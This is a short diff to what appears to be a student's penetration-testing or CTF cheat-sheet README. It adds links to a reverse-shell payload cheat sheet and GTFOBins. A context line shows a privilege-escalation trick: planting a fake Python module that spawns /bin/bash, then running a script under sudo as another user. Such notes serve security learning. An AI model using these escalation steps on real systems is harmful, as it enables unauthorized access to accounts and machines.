@@ -101,6 +101,7 @@ my name is loay morad iam computer science student in 3rd year and iam also juni
 ##### 4 · Getting & Stabilising a Shell
 
 ###### Reverse shell options
+This is a very good [reference](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) for reverse shell payloads
 
 | Condition | Command |
 |---|---|
@@ -153,6 +154,7 @@ my name is loay morad iam computer science student in 3rd year and iam also juni
 | python3 runs a script (as other user) | Script uses relative import → drop fake module in same dir: `echo 'import os; os.system("/bin/bash")' > random.py` then `sudo -u rabbit /usr/bin/python3.6 /home/alice/script.py` ·|
 
 ###### SUID / custom binary?
+[GTFOBins](https://gtfobins.github.io/gtfobins/perl/#capabilities) for some guidance in this world
 
 | Condition | Action |
 |---|---|
